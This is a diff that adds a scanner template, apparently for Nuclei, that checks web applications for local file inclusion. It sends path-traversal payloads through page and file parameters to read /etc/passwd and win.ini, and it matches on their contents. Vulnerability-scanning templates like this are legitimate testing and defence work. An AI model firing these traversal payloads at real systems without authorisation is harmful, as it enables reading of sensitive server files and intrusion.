@@ -1,0 +1,28 @@
+id: local-file-inclusion-checks
+
+info:
+  name: Custom LFI Pattern Checks
+  author: Antigravity
+  severity: high
+  description: Custom LFI payloads for common sensitive files.
+  tags: lfi, vuln
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/?page=../../../../../../etc/passwd"
+      - "{{BaseURL}}/?file=../../../../../../etc/passwd"
+      - "{{BaseURL}}/download?file=../../../../../../etc/passwd"
+      - "{{BaseURL}}/view?file=../../../../../../windows/win.ini"
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "root:x:0:0"
+          - "[extensions]"
+        condition: or
+
+      - type: status
+        status:
+          - 200
